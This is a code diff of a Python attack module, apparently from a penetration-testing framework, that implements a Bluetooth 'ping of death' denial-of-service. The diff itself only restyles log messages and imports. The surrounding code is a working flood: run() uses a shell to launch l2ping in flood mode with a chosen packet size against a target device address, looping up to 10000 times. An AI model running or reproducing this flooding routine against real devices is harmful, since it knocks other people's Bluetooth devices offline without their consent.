@@ -1,9 +1,9 @@
 #        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
 
+from core.messages import *
 import os
 import subprocess
 import time
-from core import colors
 from collections import OrderedDict
 
 conf = {
@@ -38,14 +38,14 @@ customcommands = {
 changelog = "Version 1.0:\nrelease"
 
 def run():
-	print(colors.blue + "[*] Bluetooth Ping Of Death Attack Started ..." + colors.end)
+	printInfo("bluetooth ping of death attack started...")
 	try:
 		for i in range(1, 10000):
 			xterm_1 = "l2ping -i %s -s %s -f %s &" % (variables['interface'][0], variables['size'][0], variables['bdaddr'][0])
 			subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 			time.sleep(3)
 	except(OSError):
-		print(colors.red + "[*] Something Is Wrong!" + colors.end)
+		printError("something went wrong!")
 
 
 def scan(args):
